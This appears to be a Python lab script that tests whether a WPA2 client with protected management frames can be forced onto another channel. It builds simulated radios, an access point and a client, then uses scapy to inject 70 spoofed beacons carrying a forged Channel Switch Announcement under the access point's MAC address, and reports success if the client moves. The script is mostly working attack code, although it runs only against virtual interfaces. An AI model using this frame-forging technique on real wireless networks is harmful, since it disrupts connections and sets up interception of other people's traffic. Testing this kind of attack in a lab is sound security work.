#!/usr/bin/env python3
"""Quick CSA test — hostapd 2.10, no tcpdump, no Evil Twin."""
import subprocess, time, re, sys

# Cleanup
subprocess.run("sudo pkill hostapd; sudo pkill wpa_supplicant; sudo modprobe -r mac80211_hwsim 2>/dev/null; sleep 1; sudo modprobe mac80211_hwsim radios=4", shell=True, capture_output=True)
time.sleep(2)

r = subprocess.run("sudo iw dev", shell=True, capture_output=True, text=True)
ifs = [l.split()[1] for l in r.stdout.split("\n") if "Interface" in l]
ap, sta, inj = ifs[0], ifs[1], ifs[2]

subprocess.run(f"sudo ip link set {ap} up; sudo ip link set {sta} up", shell=True)

# AP config
cfg = f"interface={ap}\ndriver=nl80211\nssid=QTest\nhw_mode=g\nchannel=6\nwpa=2\nwpa_passphrase=TestPass123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\nieee80211w=2\nbeacon_int=100\ndtim_period=2\nctrl_interface=/var/run/hostapd\nctrl_interface_group=0\n"
with open("/tmp/qt_ap.conf", "w") as f:
    f.write(cfg)
ap_p = subprocess.Popen(["sudo", "hostapd", "/tmp/qt_ap.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

# STA
cfg2 = 'ctrl_interface=/var/run/wpa_supplicant\nnetwork={\n    ssid="QTest"\n    psk="TestPass123"\n    key_mgmt=WPA-PSK\n    pairwise=CCMP\n    ieee80211w=2\n}\n'
with open("/tmp/qt_sta.conf", "w") as f:
    f.write(cfg2)
sta_p = subprocess.Popen(["sudo", "wpa_supplicant", "-i", sta, "-c", "/tmp/qt_sta.conf", "-D", "nl80211"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

# Wait for association
for i in range(25):
    r = subprocess.run(f"sudo iw dev {sta} link", shell=True, capture_output=True, text=True)
    if "Connected" in r.stdout:
        break
    time.sleep(1)

# Monitor + CSA
subprocess.run(f"sudo ip link set {inj} down; sudo iw dev {inj} set type monitor; sudo ip link set {inj} up; sudo iw dev {inj} set channel 6", shell=True)

r = subprocess.run(f"ip -c=never link show {ap}", shell=True, capture_output=True, text=True)
m = re.search(r"link/ether ([0-9a-f:]+)", r.stdout)
mac = m.group(1) if m else "02:00:00:00:00:01"

from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
csa = bytes([0x01, 11, 1])
frame = (RadioTap() /
         Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) /
         Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) /
         Dot11Elt(ID="SSID", info=b"QTest") /
         Dot11Elt(ID="DSset", info=bytes([6])) /
         Dot11Elt(ID=37, info=csa))
sendp(frame, iface=inj, count=70, inter=0.1, verbose=False)

time.sleep(15)

r = subprocess.run(f"sudo iw dev {sta} info", shell=True, capture_output=True, text=True)
m = re.search(r"channel (\d+)", r.stdout)
ch = m.group(1) if m else "?"
print(f"CHANNEL: {ch}  -> {'SUCCESS' if ch == '11' else 'BLOCKED'}")

ap_p.terminate()
sta_p.terminate()
subprocess.run("sudo modprobe -r mac80211_hwsim", shell=True)
